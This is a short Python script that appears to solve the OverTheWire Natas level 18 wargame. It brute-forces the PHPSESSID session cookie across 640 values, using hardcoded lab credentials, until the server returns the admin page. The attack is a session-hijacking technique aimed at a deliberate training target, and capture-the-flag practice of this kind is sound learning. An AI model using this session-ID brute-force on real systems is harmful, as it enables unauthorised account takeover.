#!/bin/python3

import requests

user = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
url = "http://natas18.natas.labs.overthewire.org"
search = "Username:"

for i in range(640):
    response = requests.get(url, auth=(user, password), cookies=dict(PHPSESSID=str(i)))
    
    if search in response.text:
        print(response.text)
        break

